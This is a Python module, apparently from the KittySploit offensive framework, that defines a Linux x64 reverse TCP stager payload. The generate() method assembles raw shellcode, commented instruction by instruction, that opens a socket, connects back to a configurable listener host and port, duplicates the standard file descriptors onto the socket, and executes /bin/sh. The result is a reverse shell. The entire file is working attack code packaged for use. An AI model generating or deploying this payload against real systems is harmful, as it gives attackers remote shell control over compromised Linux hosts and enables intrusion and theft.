from kittysploit import *

class Module(Payload):
	
	__info__ = {
			'name': 'Linux x64 Reverse TCP Stager',
			'description': 'Linux x64 Reverse TCP Stager',
			'author': 'KittySploit Team',
			'category': PayloadCategory.STAGER,
			'arch': Arch.X64,
			'platform': Platform.LINUX,
			'listener': 'listeners/multi/reverse_tcp',
			'handler': Handler.REVERSE
		}

	lhost = OptString('127.0.0.1', 'Connect to IP address', 'yes', False)
	lport = OptPort(5555, 'Bind Port', 'yes', False)
	
	def generate(self):
		
		shellcode = b"\x6a\x29"          # pushq  $0x29
		shellcode +=b"\x58"              # pop    %rax
		shellcode +=b"\x99"              # cltd
		shellcode +=b"\x6a\x02"          # pushq  $0x2
		shellcode +=b"\x5f"              # pop    %rdi
		shellcode +=b"\x6a\x01"          # pushq  $0x1
		shellcode +=b"\x5e"              # pop    %rsi
		shellcode +=b"\x0f\x05"          # syscall
		shellcode +=b"\x48\x97"          # xchg   %rax,%rdi
		shellcode +=b"\x48\xb9\x02\x00"  # movabs $0x100007fb3150002,%rcx
		shellcode += self.shellcode_port(self.lport)
		shellcode += self.shellcode_ip(self.lhost)
		shellcode +=b"\x51"              # push   %rcx
		shellcode +=b"\x48\x89\xe6"      # mov    %rsp,%rsi
		shellcode +=b"\x6a\x10"          # pushq  $0x10
		shellcode +=b"\x5a"              # pop    %rdx
		shellcode +=b"\x6a\x2a"          # pushq  $0x2a
		shellcode +=b"\x58"              # pop    %rax
		shellcode +=b"\x0f\x05"          # syscall
		shellcode +=b"\x6a\x03"          # pushq  $0x3
		shellcode +=b"\x5e"              # pop    %rsi
		shellcode +=b"\x48\xff\xce"      # dec    %rsi
		shellcode +=b"\x6a\x21"          # pushq  $0x21
		shellcode +=b"\x58"              # pop    %rax
		shellcode +=b"\x0f\x05"          # syscall
		shellcode +=b"\x75\xf6"          # jne    27 <dup2_loop>
		shellcode +=b"\x6a\x3b"          # pushq  $0x3b
		shellcode +=b"\x58"              # pop    %rax
		shellcode +=b"\x99"              # cltd
		shellcode +=b"\x48\xbb\x2f\x62\x69\x6e\x2f"  # movabs $0x68732f6e69622f,%rbx
		shellcode +=b"\x73\x68\x00"      # [redacted]
		shellcode +=b"\x53"              # push   %rbx
		shellcode +=b"\x48\x89\xe7"      # mov    %rsp,%rdi
		shellcode +=b"\x52"              # push   %rdx
		shellcode +=b"\x57"              # push   %rdi
		shellcode +=b"\x48\x89\xe6"      # mov    %rsp,%rsi
		shellcode +=b"\x0f\x05"          # syscall		
		return shellcode
